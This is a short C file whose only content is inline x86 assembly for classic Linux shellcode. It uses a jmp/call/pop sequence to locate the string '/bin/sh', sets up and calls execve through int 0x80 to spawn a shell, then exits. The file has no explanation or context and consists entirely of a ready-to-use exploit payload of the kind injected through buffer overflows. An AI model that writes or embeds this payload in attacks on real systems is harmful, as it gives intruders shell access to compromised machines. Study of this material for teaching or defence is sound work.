void main() {
__asm__(
        "jmp    0x1f\n\t"
        "popl   %esi\n\t"
        "movl   %esi,0x8(%esi)\n\t"
        "xorl   %eax,%eax\n\t"
	"movl   %eax,0x7(%esi)\n\t"
        "movl   %eax,0xc(%esi)\n\t"
        "movb   $0xb,%al\n\t"
        "movl   %esi,%ebx\n\t"
        "leal   0x8(%esi),%ecx\n\t"
        "leal   0xc(%esi),%edx\n\t"
        "int    $0x80\n\t"
        "xorl   %ebx,%ebx\n\t"
        "movl   %ebx,%eax\n\t"
        "inc    %eax\n\t"
        "int    $0x80\n\t"
        "call   -0x24\n\t"
        ".string \"/bin/sh\"");
}
